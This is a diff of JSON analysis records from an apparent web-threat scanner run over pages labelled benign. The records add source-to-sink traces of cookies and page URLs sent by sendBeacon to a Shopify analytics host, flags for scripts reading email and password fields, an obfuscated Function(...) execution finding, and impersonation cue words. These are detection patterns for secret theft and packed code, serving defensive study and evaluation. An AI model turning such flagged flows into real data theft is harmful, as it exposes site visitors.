+      "method": "cue_words",
+      "severity": null,
+      "count": 2,
+      "cues": [
+       "last chance"
+      ],
+      "example": "Last Chance"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 259.0,
+     "page_text_chars": 2990.0,
+     "language_confidence": 0.705,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -8690,7 +10025,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 2,
+      "cues": [],
+      "example": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 39.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 26.0,
+     "sinks_total": 11.0,
+     "flows_total": 8.0,
+     "flows_external": 2.0,
+     "behavior_risk_score": 10.0
+    }
    }
   },
   "explanation": {
@@ -8770,24 +10127,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 343.0,
-   "quality": 71.8,
-   "dom_features": 59.5,
-   "dom_model": 20.3,
-   "content": 103.9,
-   "text_models": 361.3,
-   "js_analysis": 47.9,
-   "behavior": 124.7,
-   "behavior_model": 28.5,
+   "preprocess": 373.6,
+   "quality": 70.5,
+   "dom_features": 60.6,
+   "dom_model": 21.1,
+   "content": 108.5,
+   "text_models": 356.7,
+   "js_analysis": 40.1,
+   "behavior": 126.4,
+   "behavior_model": 25.1,
    "fusion": 0.1,
-   "total": 1163.0
+   "total": 1202.9
   }
  },
  "33": {
-  "analysis_id": "355672a05cb94c4a937676f160976765",
+  "analysis_id": "fe28d03da4a440398b4be637e631ed9b",
   "request_id": "c2_benign_000233",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:57.003968+05:30",
+  "analyzed_at": "2026-10-21T08:26:05.271481+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -8861,7 +10218,20 @@
     "detail": "Page code reads 2 credential field value(s) (#withdrawal-email).",
     "evidence": "emailInput.value",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 52,
+      "code": "emailInput.value",
+      "note": "credential_input: #withdrawal-email = email field"
+     },
+     {
+      "kind": "source",
+      "line": 87,
+      "code": "emailInput.value",
+      "note": "credential_input: #withdrawal-email = email field"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -8902,7 +10272,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -8942,7 +10315,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 253.0,
+     "page_text_chars": 2994.0,
+     "language_confidence": 0.6429,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -8967,7 +10350,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_access",
+      "display": "Credential access",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 2,
+      "cues": [],
+      "example": "Page code reads 2 credential field value(s) (#withdrawal-email)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 18.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 2.0,
+     "sources_total": 12.0,
+     "sinks_total": 6.0,
+     "flows_total": 7.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 3.0
+    }
    }
   },
   "explanation": {
@@ -9047,24 +10452,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 112.4,
-   "quality": 31.2,
-   "dom_features": 23.0,
-   "dom_model": 21.4,
-   "content": 66.3,
-   "text_models": 331.2,
-   "js_analysis": 14.4,
-   "behavior": 21.9,
-   "behavior_model": 28.6,
+   "preprocess": 105.6,
+   "quality": 32.1,
+   "dom_features": 23.1,
+   "dom_model": 21.9,
+   "content": 85.9,
+   "text_models": 362.1,
+   "js_analysis": 18.3,
+   "behavior": 23.4,
+   "behavior_model": 30.4,
    "fusion": 0.1,
-   "total": 652.0
+   "total": 721.2
   }
  },
  "32": {
-  "analysis_id": "40226546ad8c47848a7374731cf94581",
+  "analysis_id": "522c1946cb5d4158ad7568dd445770a9",
   "request_id": "c2_benign_000208",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:56.329261+05:30",
+  "analyzed_at": "2026-10-21T08:26:04.532172+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -9169,7 +10574,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -9209,7 +10617,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 123.0,
+     "page_text_chars": 2997.0,
+     "language_confidence": 0.9264,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -9232,7 +10650,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 9.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 8.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -9312,24 +10742,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 61.4,
-   "quality": 35.6,
+   "preprocess": 56.3,
+   "quality": 34.7,
    "dom_features": 27.9,
-   "dom_model": 21.4,
-   "content": 46.9,
-   "text_models": 339.6,
-   "js_analysis": 9.9,
-   "behavior": 12.6,
-   "behavior_model": 33.0,
+   "dom_model": 24.7,
+   "content": 44.3,
+   "text_models": 359.2,
+   "js_analysis": 10.3,
+   "behavior": 12.1,
+   "behavior_model": 33.7,
    "fusion": 0.1,
-   "total": 589.7
+   "total": 620.9
   }
  },
  "31": {
-  "analysis_id": "162f01a8dd934008a70771478dfd35b5",
+  "analysis_id": "97ef0b0edf2d4eef869654e7e54a700f",
   "request_id": "c2_benign_000199",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:55.723554+05:30",
+  "analyzed_at": "2026-10-21T08:26:03.896179+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -9363,7 +10793,44 @@
     "detail": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "document.cookie",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "document.cookie",
+      "note": "source: document.cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_cookie_matches = document.cookie.match(/_shopify_s=([^;]*)/)",
+      "note": "assign: session_cookie_matches"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token_from_cookie = session_cookie_matches && session_cookie_matches.length === 2 ? session_cookie_matches[1]...",
+      "note": "assign: session_token_from_cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token = session_token_from_headers || session_token_from_cookie || \"\"",
+      "note": "concat: session_token"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 2736488515,url: window.location.href,navigation_start,duration: currentMs - navigation_start,sess...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "dom.inputs_outside_forms_count",
@@ -9393,7 +10860,26 @@
     "detail": "Sends the page address (location.href) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "window.location.href",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.location.href",
+      "note": "source: location.href"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 2736488515,url: window.location.href,navigation_start,duration: currentMs - navigation_start,sess...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -9433,7 +10919,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -9471,7 +10960,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 149.0,
+     "page_text_chars": 2996.0,
+     "language_confidence": 0.7673,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -9497,7 +10996,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 2,
+      "cues": [],
+      "example": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 132.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 38.0,
+     "sinks_total": 15.0,
+     "flows_total": 9.0,
+     "flows_external": 2.0,
+     "behavior_risk_score": 10.0
+    }
    }
   },
   "explanation": {
@@ -9577,24 +11098,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 95.4,
-   "quality": 43.7,
-   "dom_features": 35.6,
-   "dom_model": 20.9,
-   "content": 67.7,
-   "text_models": 364.2,
-   "js_analysis": 239.8,
-   "behavior": 754.7,
-   "behavior_model": 24.0,
+   "preprocess": 79.2,
+   "quality": 42.8,
+   "dom_features": 38.4,
+   "dom_model": 21.7,
+   "content": 64.5,
+   "text_models": 349.9,
+   "js_analysis": 238.8,
+   "behavior": 750.2,
+   "behavior_model": 22.6,
    "fusion": 0.1,
-   "total": 1647.9
+   "total": 1634.1
   }
  },
  "30": {
-  "analysis_id": "2b80913893ba4b43aad4f2074805a309",
+  "analysis_id": "de341353b98144aa9690437aa5ad3360",
   "request_id": "c2_benign_000198",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:54.061783+05:30",
+  "analyzed_at": "2026-10-21T08:26:02.247647+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -9678,7 +11199,20 @@
     "detail": "Page code reads 2 credential field value(s) (this.$refs['customer-email'], this.$refs['customer-password']).",
     "evidence": "this.$refs['customer-email'].value",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "source",
+      "line": 82,
+      "code": "this.$refs['customer-email'].value",
+      "note": "credential_input: this.$refs['customer-email'] (credential-like name)"
+     },
+     {
+      "kind": "source",
+      "line": 83,
+      "code": "this.$refs['customer-password'].value",
+      "note": "credential_input: this.$refs['customer-password'] (credential-like name)"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -9719,7 +11253,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -9759,7 +11296,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 235.0,
+     "page_text_chars": 2995.0,
+     "language_confidence": 0.586,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -9784,7 +11331,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "credential_access",
+      "display": "Credential access",
+      "method": "ast_source_sink",
+      "severity": "low",
+      "count": 2,
+      "cues": [],
+      "example": "Page code reads 2 credential field value(s) (this.$refs['customer-email'], this.$refs['customer-password'])."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 112.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 4.0,
+     "sources_total": 48.0,
+     "sinks_total": 63.0,
+     "flows_total": 7.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 3.0
+    }
    }
   },
   "explanation": {
@@ -9864,24 +11433,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 125.3,
-   "quality": 264.5,
-   "dom_features": 63.9,
-   "dom_model": 21.5,
-   "content": 106.9,
-   "text_models": 353.9,
-   "js_analysis": 230.1,
-   "behavior": 420.0,
-   "behavior_model": 21.8,
+   "preprocess": 126.9,
+   "quality": 287.5,
+   "dom_features": 66.7,
+   "dom_model": 21.1,
+   "content": 115.0,
+   "text_models": 329.8,
+   "js_analysis": 229.5,
+   "behavior": 424.3,
+   "behavior_model": 25.4,
    "fusion": 0.1,
-   "total": 1610.2
+   "total": 1642.4
   }
  },
  "29": {
-  "analysis_id": "44a48fae6e8b4a58ac6939a1787db2d1",
+  "analysis_id": "7e4bf5afca864f13a725ee34a96c335d",
   "request_id": "c2_benign_000187",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:52.437827+05:30",
+  "analyzed_at": "2026-10-21T08:26:00.590756+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -9915,7 +11484,44 @@
     "detail": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "document.cookie",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "document.cookie",
+      "note": "source: document.cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_cookie_matches = document.cookie.match(/_shopify_s=([^;]*)/)",
+      "note": "assign: session_cookie_matches"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token_from_cookie = session_cookie_matches && session_cookie_matches.length === 2 ? session_cookie_matches[1]...",
+      "note": "assign: session_token_from_cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token = session_token_from_headers || session_token_from_cookie || \"\"",
+      "note": "concat: session_token"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 24396464192,url: window.location.href,navigation_start,duration: currentMs - navigation_start,ses...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "behavior.obfuscated_execution.packed_eval",
@@ -9925,7 +11531,20 @@
     "detail": "An obfuscated script (entropy 5.54) runs code with Function (line 13).",
     "evidence": "script #21 (head): entropy 5.54",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "script",
+      "line": null,
+      "code": "script #21 (head): entropy 5.54",
+      "note": "Part 7 obfuscation statistics"
+     },
+     {
+      "kind": "sink",
+      "line": 13,
+      "code": "Function(t.response)",
+      "note": "code_execution: Function (listener for 'readystatechange' (no user action))"
+     }
+    ]
    },
    {
     "id": "content.text_model",
@@ -9945,7 +11564,26 @@
     "detail": "Sends the page address (location.href) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "window.location.href",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.location.href",
+      "note": "source: location.href"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 24396464192,url: window.location.href,navigation_start,duration: currentMs - navigation_start,ses...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -9982,7 +11620,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -10022,7 +11663,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 102.0,
+     "page_text_chars": 2993.0,
+     "language_confidence": 0.7392,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -10049,7 +11700,38 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 2,
+      "cues": [],
+      "example": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1)."
+     },
+     {
+      "intent": "obfuscated_execution",
+      "display": "Obfuscated execution",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 1,
+      "cues": [],
+      "example": "An obfuscated script (entropy 5.54) runs code with Function (line 13)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 35.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 24.0,
+     "sinks_total": 19.0,
+     "flows_total": 8.0,
+     "flows_external": 2.0,
+     "behavior_risk_score": 20.0
+    }
    }
   },
   "explanation": {
@@ -10129,24 +11811,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 46.7,
-   "quality": 30.3,
-   "dom_features": 20.7,
-   "dom_model": 25.9,
-   "content": 25.6,
-   "text_models": 341.0,
-   "js_analysis": 52.1,
-   "behavior": 119.1,
-   "behavior_model": 27.8,
+   "preprocess": 41.5,
+   "quality": 29.5,
+   "dom_features": 20.2,
+   "dom_model": 25.2,
+   "content": 37.6,
+   "text_models": 383.1,
+   "js_analysis": 50.8,
+   "behavior": 122.2,
+   "behavior_model": 24.1,
    "fusion": 0.1,
-   "total": 690.3
+   "total": 745.4
   }
  },
  "28": {
-  "analysis_id": "e6674f69997947a193c52b82f5be47c3",
+  "analysis_id": "28b7a2a16a924a28b449d301d63ccf23",
   "request_id": "c2_benign_000186",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:51.727326+05:30",
+  "analyzed_at": "2026-10-21T08:25:59.830103+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -10230,7 +11912,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -10268,7 +11953,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 109.0,
+     "page_text_chars": 2997.0,
+     "language_confidence": 0.8091,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -10291,7 +11986,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 8.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 2.0,
+     "sources_total": 2.0,
+     "sinks_total": 8.0,
+     "flows_total": 16.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -10371,24 +12078,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 61.2,
-   "quality": 33.7,
-   "dom_features": 19.9,
-   "dom_model": 22.2,
-   "content": 41.1,
-   "text_models": 360.8,
-   "js_analysis": 13.7,
-   "behavior": 16.8,
-   "behavior_model": 28.7,
+   "preprocess": 57.1,
+   "quality": 34.0,
+   "dom_features": 17.5,
+   "dom_model": 24.6,
+   "content": 32.7,
+   "text_models": 353.6,
+   "js_analysis": 13.3,
+   "behavior": 18.0,
+   "behavior_model": 34.0,
    "fusion": 0.1,
-   "total": 599.4
+   "total": 596.9
   }
  },
  "27": {
-  "analysis_id": "17f1c3f5e34b4b199e84c5284fc7cd29",
+  "analysis_id": "27c99130c864448392ffc9d30f1e40de",
   "request_id": "c2_benign_000156",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:51.105170+05:30",
+  "analyzed_at": "2026-10-21T08:25:59.210547+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -10461,7 +12168,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -10499,7 +12209,29 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "impersonation",
+      "display": "impersonation",
+      "method": "cue_words",
+      "severity": null,
+      "count": 9,
+      "cues": [
+       "sri lanka customs"
+      ],
+      "example": "Sri Lanka Customs"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 139.0,
+     "page_text_chars": 2997.0,
+     "language_confidence": 0.7929,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -10522,7 +12254,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 20.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -10602,24 +12346,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 46.4,
-   "quality": 26.0,
-   "dom_features": 20.7,
-   "dom_model": 21.8,
-   "content": 38.0,
-   "text_models": 375.0,
-   "js_analysis": 22.2,
-   "behavior": 10.4,
-   "behavior_model": 32.4,
+   "preprocess": 37.6,
+   "quality": 23.0,
+   "dom_features": 19.5,
+   "dom_model": 23.3,
+   "content": 40.1,
+   "text_models": 370.2,
+   "js_analysis": 15.3,
+   "behavior": 9.4,
+   "behavior_model": 33.9,
    "fusion": 0.1,
-   "total": 594.6
+   "total": 592.4
   }
  },
  "26": {
-  "analysis_id": "e2c0542338544ea2943b4eeb5a39191a",
+  "analysis_id": "24377efabda042e981677ce59c55d146",
   "request_id": "c2_benign_000145",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:50.489317+05:30",
+  "analyzed_at": "2026-10-21T08:25:58.595818+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -10653,7 +12397,44 @@
     "detail": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "document.cookie",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "document.cookie",
+      "note": "source: document.cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_cookie_matches = document.cookie.match(/_shopify_s=([^;]*)/)",
+      "note": "assign: session_cookie_matches"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token_from_cookie = session_cookie_matches && session_cookie_matches.length === 2 ? session_cookie_matches[1]...",
+      "note": "assign: session_token_from_cookie"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "session_token = session_token_from_headers || session_token_from_cookie || \"\"",
+      "note": "concat: session_token"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 50690490556,url: window.location.href,navigation_start,duration: currentMs - navigation_start,ses...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "behavior.external_data_transmission.low_sensitivity",
@@ -10663,7 +12444,26 @@
     "detail": "Sends the page address (location.href) to shopifysvc[.]com (navigator.sendBeacon, line 1).",
     "evidence": "window.location.href",
     "raises_verdict": false,
-    "steps": []
+    "steps": [
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.location.href",
+      "note": "source: location.href"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "payload = {shop_id: 50690490556,url: window.location.href,navigation_start,duration: currentMs - navigation_start,ses...",
+      "note": "assign: payload"
+     },
+     {
+      "kind": "flow_step",
+      "line": 1,
+      "code": "window.navigator.sendBeacon(\"hxxps://monorail-edge[.]shopifysvc[.]com/v1/produce\", JSON.stringify({schema_id: \"online_sto...",
+      "note": "sink: navigator.sendBeacon -› shopifysvc[.]com (external)"
+     }
+    ]
    },
    {
     "id": "fusion.verdict",
@@ -10700,7 +12500,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -10738,7 +12541,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 91.0,
+     "page_text_chars": 1916.0,
+     "language_confidence": 0.8495,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -10764,7 +12577,29 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "external_data_transmission",
+      "display": "External data transmission",
+      "method": "ast_source_sink",
+      "severity": "medium",
+      "count": 2,
+      "cues": [],
+      "example": "Sends cookies (document.cookie) to shopifysvc[.]com (navigator.sendBeacon, line 1)."
+     }
+    ],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 47.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 24.0,
+     "sinks_total": 11.0,
+     "flows_total": 8.0,
+     "flows_external": 2.0,
+     "behavior_risk_score": 10.0
+    }
    }
   },
   "explanation": {
@@ -10844,24 +12679,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 65.8,
-   "quality": 25.9,
-   "dom_features": 19.0,
-   "dom_model": 21.3,
-   "content": 29.2,
-   "text_models": 360.1,
-   "js_analysis": 31.4,
-   "behavior": 90.1,
-   "behavior_model": 29.6,
+   "preprocess": 44.3,
+   "quality": 29.4,
+   "dom_features": 20.8,
+   "dom_model": 32.4,
+   "content": 35.5,
+   "text_models": 363.9,
+   "js_analysis": 35.8,
+   "behavior": 93.8,
+   "behavior_model": 33.0,
    "fusion": 0.1,
-   "total": 673.7
+   "total": 694.9
   }
  },
  "25": {
-  "analysis_id": "20e4194e7f144a94a11f79fdfa7e0ae4",
+  "analysis_id": "279ab242a5b84f0b997b2264ab823e91",
   "request_id": "c2_benign_000136",
   "schema_version": "c2.analysis.v1",
